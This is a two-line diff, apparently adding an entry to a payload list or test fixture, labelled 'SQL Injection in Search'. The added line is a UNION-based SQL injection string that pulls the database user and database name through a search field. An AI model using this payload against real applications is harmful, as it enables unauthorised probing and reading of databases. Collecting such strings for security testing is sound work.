@@ -1,0 +1,2 @@
+#SQL Injection in Search
+' UNION SELECT 1, 'HACKED', user(), 2024, database() #
